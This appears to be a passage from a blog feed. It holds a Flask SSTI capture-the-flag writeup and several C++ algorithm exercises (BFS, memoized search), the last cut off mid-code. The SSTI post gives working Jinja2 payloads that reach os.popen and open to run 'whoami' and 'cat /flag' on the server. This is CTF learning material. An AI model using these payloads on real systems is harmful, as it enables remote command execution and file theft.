rel="noopener">第二届BJDCTF 2020 全部WEB题目 Writeup</a><br><a href="https://www.cnblogs.com/Konmu/p/12549038.html#bjdctf-2ndduangshell" target="_blank" rel="noopener">Konmu</a><br><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a><br><a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">如何借助ViewState在ASP.NET中实现反序列化漏洞利用</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">headers信息</a></p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
          <category> ThinkPHP5 </category>
          
          <category> Falsk </category>
          
          <category> 命令执行 </category>
          
          <category> XSS </category>
          
          <category> ASP.NET VIEWSTATE反序列化 </category>
          
          <category> CVE-2020-0688 </category>
          
          <category> vim </category>
          
          <category> curl </category>
          
          <category> PHP原生类反序列化 </category>
          
          <category> .git泄露 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> WEB </tag>
            
            <tag> Linux </tag>
            
            <tag> headers </tag>
            
            <tag> sql </tag>
            
            <tag> Python </tag>
            
            <tag> ASP.NET </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次ssti注入(flask)</title>
      <link href="/2020/03/27/%E6%B5%85%E8%B0%88ssti%E6%B3%A8%E5%85%A5-flask/"/>
      <url>/2020/03/27/%E6%B5%85%E8%B0%88ssti%E6%B3%A8%E5%85%A5-flask/</url>
      
        <content type="html"><![CDATA[<p>上周BJDCTF有一道ssti注入题，当时瞎猫碰上死耗子，给我撞过去了。对Python，平常也没有C++和java用的频繁，记录一下正常思路。顺便学习一下，以后遇到了不能光靠运气撞过去了&#x3D; &#x3D;</p><a id="more"></a><h2 id="一些简单注入"><a href="#一些简单注入" class="headerlink" title="一些简单注入"></a>一些简单注入</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;config&#125;&#125;</span>可以获取当前设置</span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>.__dict__._TemplateReference__context.config&#125;&#125;</span> 同样可以看到config</span><br></pre></td></tr></table></figure><p id="div-border-left-red">__class__  返回类型所属的对象<br>__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>__init__  类的初始化方法<br>__globals__  对包含函数全局变量的字典的引用<br>__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br>__bases__   返回该对象所继承的基类__builtins__是做为默认初始模块</p><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>大部分都是先查找warnings.catch_warnings模块中的OS模块，如果关键字被禁用了，可以用base64或者字符串拼接过去比如说<code>&#39;o&#39;+&#39;s&#39;</code></p><p>还可以用tplmap这个工具进行检测是否有模板注入漏洞，用法有点像sqlmap。</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[0].<span class="strong">__subclasses__</span>() </span><br><span class="line">---查看可用模块</span><br><span class="line"></span><br><span class="line">().<span class="strong">__class__</span>.base<span class="strong">__.__</span>subclasses<span class="emphasis">__().index(warnings.catch_</span>warnings)</span><br><span class="line">可以查看当前位置，不过题目环境不能用。手动数吧= = 169位</span><br><span class="line"></span><br><span class="line">&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'eval'</span>](<span class="link">"__import__('os'</span>).popen('whoami').read()")&#125;&#125;</span><br><span class="line">发现可以执行，构造命令</span><br><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[1].<span class="strong">__subclasses__</span>()[169].<span class="strong">__init__</span>.<span class="strong">__globals__</span>['<span class="strong">__builtins__</span>'].eval("<span class="strong">__import__</span>('os').popen('cat /flag').read()")&#125;&#125;</span><br><span class="line">没有什么过滤= =友好!</span><br></pre></td></tr></table></figure><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">或者找到os.<span class="emphasis">_wrap_</span>close模块 117个</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;  </span><br><span class="line">当前文件夹</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'cat /flag'</span>).read()&#125;&#125;</span><br><span class="line">来打开文件，payload有很多慢慢摸索慢慢积累= =</span><br></pre></td></tr></table></figure><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我的payload：</span><br><span class="line">&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br><span class="line">我找的threading.Semaphore模块。。</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">CTF SSTI(服务器模板注入)</a><br><a href="https://www.cnblogs.com/Konmu/p/12549038.html" target="_blank" rel="noopener">BJDCTF-WP</a><br><a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">SSTI&#x2F;沙盒逃逸详细总结</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
          <category> ssti注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BFS优先队列</title>
      <link href="/2020/03/26/BFS%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/"/>
      <url>/2020/03/26/BFS%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h2><blockquote class="blockquote-center"><p>优先队列容器与队列一样，只能从队尾插入元素，从队首删除元素。但是它有一个特性，就是队列中最大的元素总是位于队首，所以出队时，并非按照先进先出的原则进行，而是将当前队列中最大的元素出队。这点类似于给队列里的元素进行了由大到小的顺序排序。元素的比较规则默认按元素值由大到小排序，可以重载“&lt;”操作符来重新定义比较规则，和普通队列不同的是，队首元素是q.top()。</p></blockquote><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在育英，大家最头疼的事情就是晨跑了，因为每天早上大家都要被迫从温暖的被窝爬起来去晨跑令人非常不爽。<br>育英的晨跑是使用一款APP来规定晨跑路线，我们可以把育英校园看作一个n * m的二维矩阵。LZY的起点在左上角（0，0），而APP规定的终点为右下角（n - 1,m - 1) 。<br>LZY跑到每个点的用时都不一样，现在LZY为了偷懒，想找一条耗时最短的捷径，你能帮帮他吗？</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>测试样例由多组测试数据组成。每组测试数据第一行输入两个正整数n, m（1 &lt;&#x3D; n,m &lt;&#x3D; 100）<br>接下来输入n*m个数字，每个数字不超过500</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>输出LZY从起点跑到终点的最短用时</p><h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><p>8</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>利用排序规则，让时间更短的路径出队顺序，提高效率。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k,mixn;</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">110</span>][<span class="number">110</span>];</span><br><span class="line"><span class="keyword">int</span> Map[<span class="number">110</span>][<span class="number">110</span>]; </span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(fun a,fun b)&#123;</span><br><span class="line"><span class="keyword">return</span> a.t&gt;b.t;<span class="comment">//相反的     时间短的在前面</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;great;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">priority_queue&lt;fun&gt; q;</span><br><span class="line">great.x=<span class="number">0</span>;</span><br><span class="line">great.y=<span class="number">0</span>;</span><br><span class="line">great.t=Map[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">vis[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">q.push(great);</span><br><span class="line">mixn=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">fun num=q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">if</span>(num.x==n<span class="number">-1</span>&amp;&amp;num.y==m<span class="number">-1</span>)&#123;</span><br><span class="line">mixn=num.t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> xx=num.x+dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> yy=num.y+dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(xx&lt;<span class="number">0</span>||xx&gt;=n||yy&lt;<span class="number">0</span>||yy&gt;=m||num.t+Map[xx][yy]&gt;mixn)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(vis[xx][yy]==<span class="number">0</span>)&#123;</span><br><span class="line">vis[xx][yy]=<span class="number">1</span>;</span><br><span class="line">great.x=xx;</span><br><span class="line">great.y=yy;</span><br><span class="line">great.t=num.t+Map[xx][yy];</span><br><span class="line">q.push(great);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;Map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bfs();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,mixn);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU-Pascal&#39;s Travels(记忆化搜索)</title>
      <link href="/2020/03/26/HDU-Pascal-s-Travels-%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/"/>
      <url>/2020/03/26/HDU-Pascal-s-Travels-%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p id="div-border-left-blue">题目</p> nxn游戏板上装有整数，每平方一个非负整数。目标是沿着板子的左上角到右下角的任何合法路径行进。任何一个正方形中的整数表示距该位置必须多大的步幅。如果步长将提前离开游戏板，则禁止沿该特定方向前进。所有步骤都必须在右侧或底部。请注意，0是一个死角，会阻止进一步的进展。<br>考虑图1所示的4 x 4板，其中实心圆圈标识起始位置，而虚线圆圈标识目标。图2显示了从起点到目标的三个路径，每个路径中不相关的数字都已删除。<br><a id="more"></a><blockquote class="blockquote-center"><p><img src="/1.jpg"><br><img src="/2.jpg"></p></blockquote><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入包含1到30个板的数据，最后一行仅包含整数-1。电路板的数据从包含单个正整数n（4 &lt;&#x3D; n &lt;&#x3D; 34）的行开始，n是该电路板中的行数。随后是n行数据。每行包含n个数字，0-9，中间没有空格。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>每个板的输出由一行组成，包含一个整数，该整数是从左上角到右下角的路径数。任何一块板的路径将少于2 ^ 63。</p><h2 id="样本输入"><a href="#样本输入" class="headerlink" title="样本输入"></a>样本输入</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2331</span></span><br><span class="line"><span class="number">1213</span></span><br><span class="line"><span class="number">1231</span></span><br><span class="line"><span class="number">3110</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3332</span></span><br><span class="line"><span class="number">1213</span></span><br><span class="line"><span class="number">1232</span></span><br><span class="line"><span class="number">2120</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">11101</span></span><br><span class="line"><span class="number">01111</span></span><br><span class="line"><span class="number">11111</span></span><br><span class="line"><span class="number">11101</span></span><br><span class="line"><span class="number">11101</span></span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure><h2 id="样本输出"><a href="#样本输出" class="headerlink" title="样本输出"></a>样本输出</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k,Max;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> vis[<span class="number">110</span>][<span class="number">110</span>];</span><br><span class="line"><span class="keyword">int</span> Map[<span class="number">110</span>][<span class="number">110</span>]; </span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==n<span class="number">-1</span>&amp;&amp;y==n<span class="number">-1</span>)&#123;     <span class="comment">//到点</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(vis[x][y])&#123;</span><br><span class="line"><span class="keyword">return</span> vis[x][y];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">0</span>||y&lt;<span class="number">0</span>||x&gt;=n||y&gt;=n||Map[x][y]==<span class="number">0</span>)&#123;     <span class="comment">//如果为0或者超出范围</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vis[x][y]+=dfs(x+Map[x][y],y)+dfs(x,y+Map[x][y]);  <span class="comment">//两个方向</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> vis[x][y];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">Map[i][j]=s[j]-<span class="string">'0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,dfs(<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被X包围的区域(BFS)-逆向思维</title>
      <link href="/2020/03/20/%E8%A2%ABX%E5%8C%85%E5%9B%B4%E7%9A%84%E5%8C%BA%E5%9F%9F-BFS-%E9%80%86%E5%90%91%E6%80%9D%E7%BB%B4/"/>
      <url>/2020/03/20/%E8%A2%ABX%E5%8C%85%E5%9B%B4%E7%9A%84%E5%8C%BA%E5%9F%9F-BFS-%E9%80%86%E5%90%91%E6%80%9D%E7%BB%B4/</url>
      
        <content type="html"><![CDATA[<p>寻找被围住的O，可以利用逆向思维，把没围住的找出来，剩下的皆是围住的。之前期末的时候卡了好久</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p id="div-border-left-blue">给定一个二维的矩阵，包含 'X' 和 'O'（字母 O）。找到所有被 'X' 围绕的区域，并将这些区域里所有的 'O' 用 'X' 填充。</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p id="div-border-top-red">输入样例由多组数据组成。第一行输入两个正整数n，m表示边界。（1<=n,m<=100）接下来输入n*m个'X'和'O'表示矩阵。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p id="div-border-top-red">输出一个n*m的矩阵表示填充后的矩阵。</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4 4</span><br><span class="line"><span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span></span><br><span class="line"><span class="meta">X</span> O O <span class="meta">X</span></span><br><span class="line"><span class="meta">X</span> <span class="meta">X</span> O <span class="meta">X</span></span><br><span class="line"><span class="meta">X</span> O <span class="meta">X</span> <span class="meta">X</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span></span><br><span class="line"><span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span></span><br><span class="line"><span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span> <span class="meta">X</span></span><br><span class="line"><span class="meta">X</span> O <span class="meta">X</span> <span class="meta">X</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,t,zx,zy,flag;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">102</span>][<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">102</span>][<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">&#125;great;</span><br><span class="line"><span class="built_in">queue</span>&lt;fun&gt; q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">fun now=q.front();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> xx=now.x+dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> yy=now.y+dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;=n||yy&gt;=m)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(vis[xx][yy]==<span class="number">0</span>&amp;&amp;Map[xx][yy]==<span class="string">'O'</span>)&#123;       <span class="comment">//讲O标记</span></span><br><span class="line">vis[xx][yy]=<span class="number">1</span>;</span><br><span class="line">great.x=xx;</span><br><span class="line">great.y=yy;</span><br><span class="line">q.push(great);</span><br><span class="line">&#125;</span><br><span 